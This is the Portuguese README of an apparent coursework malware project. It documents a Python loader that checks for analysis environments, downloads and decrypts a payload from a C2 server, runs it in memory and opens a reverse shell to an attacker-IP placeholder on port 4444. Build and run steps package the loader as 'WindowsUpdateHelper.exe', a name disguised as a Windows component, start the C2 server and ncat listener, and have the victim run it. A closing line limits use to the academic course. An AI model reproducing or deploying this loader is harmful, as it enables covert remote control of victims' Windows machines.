# Downloader / Loader com Reverse Shell

**Linguagem:** Python 3.10+ | **Alvo:** Windows 10/11 x64

---

## Estrutura

```
cp03-loader/
├── src/
│   ├── main.py           # ponto de entrada
│   ├── antianalysis.py   # verificações de ambiente
│   ├── network.py        # download e decriptação
│   └── executor.py       # execução em memória
├── c2/
│   ├── server.py         # servidor C2
│   ├── encrypt.py        # encripta o payload
│   ├── key.bin           # chave XOR (gerada pelo encrypt.py)
│   └── stage2.enc        # payload encriptado (gerado pelo encrypt.py)
├── payload/
│   └── revshell.py       # reverse shell (Stage 2)
└── build.bat
```

---

## Pré-requisitos

```
Python 3.10+
pip install pyinstaller
ncat (Nmap) — máquina atacante
```

---

## Configuração

**`src/main.py`** — IP do servidor C2:
```python
_C2_SEGMENTS = ("http://", "IP_DO_ATACANTE", ":8080")
```

**`payload/revshell.py`** — IP e porta do listener:
```python
_HOST = "IP_DO_ATACANTE"
_PORT = 4444
```

> `_TEST_MODE = True` em `src/main.py` reduz o sleep inicial de 30–120s para 1–3s.

---

## Compilação

```cmd
cd c2
python encrypt.py ..\payload\revshell.py

cd ..
pyinstaller --onefile --noconsole --name "WindowsUpdateHelper" --paths "src" --hidden-import "multiprocessing" src\main.py
```

Gera: `dist\WindowsUpdateHelper.exe`

---

## Execução

**Terminal 1 (C2):**
```cmd
cd c2
python server.py
```

**Terminal 2 (listener):**
```cmd
ncat -lvnp 4444
```

**Máquina vítima:**
```
Executar WindowsUpdateHelper.exe
```

---

## Uso autorizado

Desenvolvido para a disciplina CP03 — Malware Development.
Uso fora do ambiente acadêmico não é autorizado.
